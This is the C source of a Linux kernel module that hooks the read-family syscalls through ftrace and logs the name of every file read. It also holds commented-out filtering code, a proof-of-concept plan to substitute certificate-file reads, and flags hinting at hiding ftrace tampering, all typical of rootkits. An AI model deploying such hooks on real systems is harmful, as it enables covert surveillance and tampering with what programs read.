// SPDX-License-Identifier: GPL-2.0
#define pr_fmt(fmt) "%s:%s: " fmt, KBUILD_MODNAME, __func__

#include "include/core.h"
#include "ftrace/ftrace_helper.h"
#include "read_interceptor.h"

extern char saved_ftrace_value[64];
extern bool ftrace_write_intercepted;

#define MAX_CAP (1024*1024)
#define MIN_KERNEL_READ 256

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_read_ia32)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_pread64_ia32)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_preadv)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_preadv_ia32)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_readv)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_readv_ia32)(const struct pt_regs *regs);

static asmlinkage int (*orig_get_cmdline)(struct task_struct *task, char *buffer, int buflen);

// POC defines
#define FIXED_PREFIX "/nix"
#define FIXED_SUFFIX ".crt"
#define FIXED_REPLACEMENT "/etc/ssl/certs/ca-certificates.crt"

static notrace asmlinkage long hook_get_cmdline(struct task_struct *task, char *buffer, int buflen) {
    return orig_get_cmdline(task,buffer,buflen);
}

static notrace asmlinkage ssize_t hook_read_ia32(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg, ftrace_disabled;
    ssize_t res = 0, orig_res;
    int fd;
    char __user *user_buf;
    size_t count;

    if (!orig_read_ia32)
        return -EINVAL;

    fd = regs->bx;
    user_buf = (char __user *)regs->cx;
    count = (size_t)regs->dx;

    if (!user_buf)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_read_ia32(regs);

    filename = NULL;
    pr_info("read_ia32:%s", filename);
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;

    fput(file);
    orig_res = orig_read_ia32(regs);
    if (orig_res <= 0)
        return orig_res;
    return orig_res;
}

static notrace asmlinkage ssize_t hook_pread64(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    ssize_t res, orig_res;
    int fd = regs->di;
    char __user *user_buf = (char __user *)regs->si;

    if (!orig_pread64 || !user_buf)
        return orig_pread64 ? orig_pread64(regs) : -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_pread64(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    pr_info("pread64:%s", filename);

    orig_res = orig_pread64(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }
    fput(file);
    return orig_res;
}

static notrace asmlinkage ssize_t hook_pread64_ia32(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    ssize_t res, orig_res;
    int fd = regs->bx;
    char __user *user_buf = (char __user *)regs->cx;

    if (!orig_pread64_ia32 || !user_buf)
        return orig_pread64_ia32 ? orig_pread64_ia32(regs) : -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_pread64_ia32(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    pr_info("pread64_ia32:%s", filename);

    orig_res = orig_pread64_ia32(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }
    fput(file);
    return orig_res;
}

static notrace asmlinkage ssize_t hook_preadv(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    int fd = regs->di;
    struct iovec __user *iov = (struct iovec __user *)regs->si;
    ssize_t orig_res, filtered;

    if (!orig_preadv || !iov)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_preadv(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    pr_info("preadv:%s", filename);

    orig_res = orig_preadv(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    // {
    //     struct iovec iov_copy;
    //     if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
    //         fput(file);
    //         return orig_res;
    //     }
    //     filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    //     fput(file);
    //     return filtered;
    // }

    fput(file);
    return orig_res;
}

static notrace asmlinkage ssize_t hook_preadv_ia32(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    int fd = regs->bx;
    struct iovec __user *iov = (struct iovec __user *)regs->cx;
    ssize_t orig_res, filtered;

    if (!orig_preadv_ia32 || !iov)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_preadv_ia32(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    pr_info("preadv_ia32:%s", filename);

    orig_res = orig_preadv_ia32(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    // {
    //     struct iovec iov_copy;
    //     if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
    //         fput(file);
    //         return orig_res;
    //     }
    //     filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    //     fput(file);
    //     return filtered;
    // }

    fput(file);
    return orig_res;
}

static notrace asmlinkage ssize_t hook_readv(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    int fd = regs->di;
    struct iovec __user *iov = (struct iovec __user *)regs->si;
    ssize_t orig_res, filtered;

    if (!orig_readv || !iov)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_readv(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    pr_info("readv:%s", filename);

    orig_res = orig_readv(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    // {
    //     struct iovec iov_copy;
    //     if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
    //         fput(file);
    //         return orig_res;
    //     }
    //     filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    //     fput(file);
    //     return filtered;
    // }

    fput(file);
    return orig_res;
}

static notrace asmlinkage ssize_t hook_readv_ia32(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg;
    int fd = regs->bx;
    struct iovec __user *iov = (struct iovec __user *)regs->cx;
    ssize_t orig_res, filtered;

    if (!orig_readv_ia32 || !iov)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_readv_ia32(regs);

    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;
    pr_info("readv_ia32:%s", filename);

    orig_res = orig_readv_ia32(regs);
    if (orig_res <= 0) {
        fput(file);
        return orig_res;
    }

    // {
    //     struct iovec iov_copy;
    //     if (copy_from_user(&iov_copy, iov, sizeof(struct iovec))) {
    //         fput(file);
    //         return orig_res;
    //     }
    //     filtered = filter_buffer_content(iov_copy.iov_base, orig_res);
    //     fput(file);
    //     return filtered;
    // }
    
    fput(file);
    return orig_res;
}

static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
    struct file *file;
    const char *filename;
    bool is_kmsg, ftrace_disabled;
    ssize_t res = 0, orig_res;
    int fd;
    char __user *user_buf;
    size_t count;

    if (!orig_read)
        return -EINVAL;

    fd = regs->di;
    user_buf = (char __user *)regs->si;
    count = (size_t)regs->dx;

    if (!user_buf)
        return -EFAULT;

    file = fget(fd);
    if (!file)
        return orig_read(regs);

    filename = NULL;
        
    if (file->f_path.dentry)
        filename = file->f_path.dentry->d_name.name;
    pr_info("read:%s", filename);

    fput(file);
    orig_res = orig_read(regs);
    if (orig_res <= 0)
        return orig_res;
    return orig_res;
}


static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_read", hook_read, &orig_read),
    HOOK("__ia32_sys_read", hook_read_ia32, &orig_read_ia32),
    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
    HOOK("__ia32_sys_pread64", hook_pread64_ia32, &orig_pread64_ia32),
    HOOK("__x64_sys_readv", hook_readv, &orig_readv),
    HOOK("__ia32_sys_readv", hook_readv_ia32, &orig_readv_ia32),
    HOOK("__x64_sys_preadv", hook_preadv, &orig_preadv),
    HOOK("__ia32_sys_preadv", hook_preadv_ia32, &orig_preadv_ia32),
    // get_cmdline lets us discover who's reading (well enough)
    HOOK("get_cmdline",     hook_get_cmdline, &orig_get_cmdline),
};

notrace int read_interceptor_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void read_interceptor_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
